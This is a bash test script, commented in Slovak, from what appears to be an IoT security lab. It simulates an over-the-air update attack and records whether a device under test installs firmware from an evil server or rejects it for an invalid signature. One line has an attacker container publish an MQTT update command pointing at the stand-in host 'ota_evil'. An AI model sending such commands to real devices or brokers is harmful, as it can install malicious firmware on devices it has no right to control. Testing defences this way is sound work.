#!/usr/bin/env bash
# OTA utok - attacker presmeruje DUT na evil OTA server
# Baseline: DUT aplikuje evil firmware (KPI: ota_applied>0)
# Secure:   DUT odmietne (neplatny podpis) (KPI: ota_blocked>0)
set -euo pipefail
cd "$(dirname "$0")/.."

RUN_ID=$(grep '^RUN_ID=' .env | cut -d= -f2)
OUTLOG="runs/${RUN_ID}/logs/ota_attack.log"
STATE_FILE="runs/${RUN_ID}/state/version.json"
DUT_LOG="runs/${RUN_ID}/logs/dut.log"
EVIL_LOG="runs/${RUN_ID}/logs/ota_evil_access.log"
read_state_version() {
  python - "$1" <<'PY'
import json
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
if not path.exists():
    print("unknown")
    raise SystemExit(0)

try:
    data = json.loads(path.read_text(encoding="utf-8"))
except Exception:
    print("unknown")
    raise SystemExit(0)

print(str(data.get("version", "unknown")))
PY
}

BEFORE_VERSION="$(read_state_version "$STATE_FILE")"
DUT_LINES_BEFORE="$(wc -l < "$DUT_LOG" 2>/dev/null || echo 0)"
EVIL_HTTP_BEFORE="$(grep -c 'GET /' "$EVIL_LOG" 2>/dev/null || true)"

: > "$OUTLOG"
printf 'BEFORE_VERSION=%s\nDUT_LINES_BEFORE=%s\nEVIL_HTTP_BEFORE=%s\n' \
  "$BEFORE_VERSION" "$DUT_LINES_BEFORE" "$EVIL_HTTP_BEFORE" >> "$OUTLOG"

echo "=== OTA ATTACK (evil server redirect) ==="
echo ""
echo "[1] Attacker posiela cmd/ota s URL evil servera..."
docker compose exec -T attacker \
  mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil" -d
echo "EVIL_TRIGGER_SENT" >> "$OUTLOG"
echo ""
echo "[2] Cakam na DUT reakciu..."
for _ in $(seq 1 20); do
  NEW_DUT_LINES="$(tail -n +"$((DUT_LINES_BEFORE + 1))" "$DUT_LOG" 2>/dev/null || true)"
  if printf '%s\n' "$NEW_DUT_LINES" | grep -qi "OTA\|ZAMIETNUT\|aplikovan\|podpis"; then
    break
  fi
  sleep 1
done

echo ""
echo "[3] DUT log (posledne OTA zaznamy):"
grep -i "OTA\|aplikovan\|ZAMIETNUT\|podpis" "$DUT_LOG" 2>/dev/null | tail -10 \
  || echo "  (log zatial prazdny)"

AFTER_VERSION="$(read_state_version "$STATE_FILE")"
DUT_LINES_AFTER="$(wc -l < "$DUT_LOG" 2>/dev/null || echo 0)"
EVIL_HTTP_AFTER="$(grep -c 'GET /' "$EVIL_LOG" 2>/dev/null || true)"
printf 'AFTER_VERSION=%s\nDUT_LINES_AFTER=%s\nEVIL_HTTP_AFTER=%s\n' \
  "$AFTER_VERSION" "$DUT_LINES_AFTER" "$EVIL_HTTP_AFTER" >> "$OUTLOG"
{
  echo "DUT_NEW_BEGIN"
  tail -n +"$((DUT_LINES_BEFORE + 1))" "$DUT_LOG" 2>/dev/null || true
  echo "DUT_NEW_END"
} >> "$OUTLOG"

echo ""
echo "=== Skontroluj summary.json: ota_applied vs ota_blocked ==="
